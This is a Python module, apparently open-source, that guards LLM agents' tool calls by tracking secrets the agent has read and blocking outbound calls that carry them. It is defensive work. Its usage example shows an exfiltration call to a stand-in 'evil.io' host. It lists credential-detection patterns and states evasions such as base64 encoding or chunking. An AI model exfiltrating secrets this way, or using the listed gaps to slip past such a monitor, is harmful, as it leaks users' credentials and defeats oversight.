"""
Action Guard — exfiltration-by-value detection for tool-using agents.
=====================================================================

An LLM agent that reads a credential and then POSTs it somewhere never *says*
anything harmful. Output filtering cannot see it. You cannot filter your way out
of an action.

This guard sits at the tool-call boundary and decides BEFORE the action fires.
When the agent reads data, the guard remembers the secret values it saw. If any
of those values later shows up in an outbound call, that is exfiltration
*by value* — a hard trip — regardless of how safe the tool looked.

    agent reads secrets.env   ->  observe_read()   ->  values tainted
    agent calls http_post(...) ->  evaluate()      ->  CONTAIN, tool never runs

WHY THERE IS NO MODEL IN THE DETECTION PATH
-------------------------------------------
The decision is pure string and pattern matching over data the guard already
saw. That means it is:

  - deterministic       — same input, same verdict, every time
  - free                — no tokens, no inference latency
  - un-promptable       — there is no context window for an attacker to poison,
                          so it cannot be prompt-injected the way an
                          LLM-as-judge can

That last property is the point. A judge model defending against prompt
injection is itself a prompt-injection target.

SCOPE — read this before trusting it
------------------------------------
This is the exfiltration layer, extracted standalone from a larger oversight
system so that the specific claim below is independently checkable:

    a secret the agent has read cannot leave through an outbound tool call

It is NOT a complete agent security solution. Deliberately out of scope here:
intent screening, autonomy downgrade on goal conflict, tool risk tiering,
multi-step sequence analysis, signed attestation, and the M-of-N human restore
flow. Those live in the full system.

KNOWN LIMITATIONS — stated plainly
----------------------------------
  - Encoding defeats it. A base64'd, chunked, or paraphrased secret will not
    match by value. Pattern detection catches some of this; nothing catches all
    of it. This is a real gap, not a theoretical one.
  - The taint set is bounded at 300 values per system to cap memory. A very
    chatty agent can age entries out.
  - Outbound tool detection is name-based. A tool named `sync_to_partner` with
    no matching substring is not recognized as outbound unless you add it.
  - Secrets shorter than 5 characters are ignored to avoid false positives.

Python 3.9+. Standard library only.

Author: Aaron Dennis <aaron@vexaai.app>
License: MIT
"""
from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from typing import Any, Dict, Iterable, List, Optional, Set

__all__ = ["ActionGuard", "GuardVerdict", "GuardDecision"]


# ---------------------------------------------------------------------------
# What counts as a secret, and what counts as "leaving"
# ---------------------------------------------------------------------------

#: Recognizes common credential shapes on sight, even if the guard never saw
#: the value get read. Provider keys, AWS access keys, PEM private keys, JWTs,
#: and generic `key = value` credential assignments.
SECRET_RX = re.compile(
    r"sk-[A-Za-z0-9\-]{6,}"
    r"|AKIA[0-9A-Z]{8,}"
    r"|-----BEGIN [A-Z ]*PRIVATE KEY-----"
    r"|eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}"
    r"|(?:password|passwd|secret|api[_-]?key|access[_-]?key|token|db[_-]?pass)\s*[:=]\s*\S{4,}",
    re.IGNORECASE,
)

#: Pulls the *value* side out of any `KEY=value` / `KEY: value` line. This is
#: what makes detection work on secrets the guard has no pattern for — it
#: learns them by watching the read.
KV_VALUE_RX = re.compile(r"^[\w.\-]{2,}\s*[:=]\s*(\S{5,})\s*$", re.MULTILINE)

#: Tools that move data off the box.
OUTBOUND_TOOLS = (
    "send_email", "send_message", "post_to_slack", "http_post", "http_put",
    "http_delete", "webhook", "upload", "make_payment", "transfer_funds",
    "fetch_url", "web_fetch", "post_to", "create_webhook",
)

#: Substrings that mark an unknown tool as outbound anyway.
OUTBOUND_HINTS = ("send", "post", "upload", "email", "http", "webhook")

#: Cap on tainted values retained per system.
MAX_TAINT = 300

#: Minimum length for a learned value. Shorter than this is noise.
MIN_TAINT_LEN = 5

#: Minimum length for a pattern-matched secret.
MIN_PATTERN_LEN = 6


# ---------------------------------------------------------------------------
# Verdicts
# ---------------------------------------------------------------------------

class GuardVerdict(Enum):
    ALLOW = "allow"        # nothing seen; proceed
    FLAG = "flag"          # proceed, but record it for an analyst
    CONTAIN = "contain"    # hard trip: do not execute, contain the agent


@dataclass
class GuardDecision:
    verdict: GuardVerdict
    allowed: bool
    signals: List[str] = field(default_factory=list)
    reasoning: str = ""
    contained: bool = False
    matched_values: List[str] = field(default_factory=list)
    synthetic_result: Optional[str] = None
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())


# ---------------------------------------------------------------------------
# The guard
# ---------------------------------------------------------------------------

class ActionGuard:
    """
    Taint-tracking exfiltration guard for agent tool calls.

    Usage::

        guard = ActionGuard()

        # whenever a read/query tool returns, show the guard the result
        guard.observe_read("agent-1", file_contents)

        # before executing any tool call, ask
        d = guard.evaluate(
            system_id="agent-1",
            tool_name="http_post",
            parameters={"url": "https://evil.io/?k=sk-live-..."},
        )
        if not d.allowed:
            return d.synthetic_result      # the tool MUST NOT run

    The caller is responsible for honoring the verdict. This class stops
    nothing on its own — it tells you what to stop.
    """

    def __init__(
        self,
        outbound_tools: Iterable[str] = OUTBOUND_TOOLS,
        outbound_hints: Iterable[str] = OUTBOUND_HINTS,
        max_taint: int = MAX_TAINT,
        on_contain=None,
    ) -> None:
        """
        Args:
            outbound_tools: exact tool names treated as data-egress.
            outbound_hints: substrings that mark an unknown tool as egress.
            max_taint:      cap on retained values per system.
            on_contain:     optional callback ``fn(system_id, decision)`` invoked
                            on a hard trip. Wire your own containment here.
        """
        self._taint: Dict[str, Set[str]] = {}
        self._outbound_tools = set(outbound_tools)
        self._outbound_hints = tuple(outbound_hints)
        self._max_taint = max_taint
        self._on_contain = on_contain

    # ------------------------------------------------------------------
    def observe_read(self, system_id: str, result_text: str) -> int:
        """
        Feed the RESULT of a read/query tool so the guard learns the secret
        values this agent has now seen.

        Two extraction passes run over the text:
          1. ``KV_VALUE_RX`` — the value side of any ``KEY=value`` line. This is
             how unknown-format secrets get learned.
          2. ``SECRET_RX``   — recognizable credential shapes anywhere in the text.

        Returns the number of *new* values added to the taint set.
        """
        if not result_text:
            return 0

        found: Set[str] = set()

        for m in KV_VALUE_RX.finditer(result_text):
            v = m.group(1).strip()
            if len(v) >= MIN_TAINT_LEN:
                found.add(v)

        for m in SECRET_RX.finditer(result_text):
            s = m.group(0).strip()
            if len(s) >= MIN_PATTERN_LEN:
                found.add(s)

        if not found:
            return 0

        tainted = self._taint.setdefault(system_id, set())
        before = len(tainted)
        tainted.update(found)

        if len(tainted) > self._max_taint:
            self._taint[system_id] = set(list(tainted)[-self._max_taint:])

        return len(self._taint[system_id]) - before

    # ------------------------------------------------------------------
    def is_outbound(self, tool_name: str) -> bool:
        """True if this tool can move data off the box."""
        if tool_name in self._outbound_tools:
            return True
        lowered = tool_name.lower()
        return any(h in lowered for h in self._outbound_hints)

    # ------------------------------------------------------------------
    def evaluate(
        self,
        *,
        system_id: str,
        tool_name: str,
        parameters: Dict[str, Any],
    ) -> GuardDecision:
        """
        Decide whether this tool call may execute. Call this BEFORE running the
        tool. If ``decision.allowed`` is False the caller must not execute it and
        should hand ``decision.synthetic_result`` back to the agent instead.
        """
        signals: List[str] = []

        if not self.is_outbound(tool_name):
            return GuardDecision(
                verdict=GuardVerdict.ALLOW,
                allowed=True,
                reasoning=f"{tool_name} is not an outbound tool",
            )

        # Serialize the whole parameter payload — the secret could be in a URL
        # query string, a JSON body, an email body, a header, anywhere.
        haystack = json.dumps(parameters, default=str)

        # (a) Known-value match: something this agent actually read is leaving.
        matched = sorted(
            v for v in self._taint.get(system_id, ()) if v and v in haystack
        )

        # (b) Pattern match: looks like a credential even if we never saw it read.
        pattern_hit = SECRET_RX.search(haystack)

        if matched or pattern_hit:
            signals.append("exfil:secret_in_outbound:critical")
            what = (matched[0][:16] + "…") if matched else "secret-pattern"
            reasoning = (
                f"data exfiltration: secret ({what}) present in outbound {tool_name}"
            )
            decision = GuardDecision(
                verdict=GuardVerdict.CONTAIN,
                allowed=False,
                signals=signals,
                reasoning=reasoning,
                contained=True,
                matched_values=matched,
                synthetic_result=json.dumps({
                    "error": "Action blocked at the boundary: outbound call "
                             "contained a secret this agent had read."
                }),
            )
            if self._on_contain is not None:
                try:
                    self._on_contain(system_id, decision)
                except Exception:
                    pass
            return decision

        return GuardDecision(
            verdict=GuardVerdict.ALLOW,
            allowed=True,
            reasoning=f"outbound {tool_name}, no tainted or pattern-matched secret present",
        )

    # ------------------------------------------------------------------
    def tainted_values(self, system_id: str) -> Set[str]:
        """Inspect what the guard has learned for a system. Useful in tests."""
        return set(self._taint.get(system_id, set()))

    def clear(self, system_id: Optional[str] = None) -> None:
        """Forget taints for one system, or all of them."""
        if system_id is None:
            self._taint.clear()
        else:
            self._taint.pop(system_id, None)
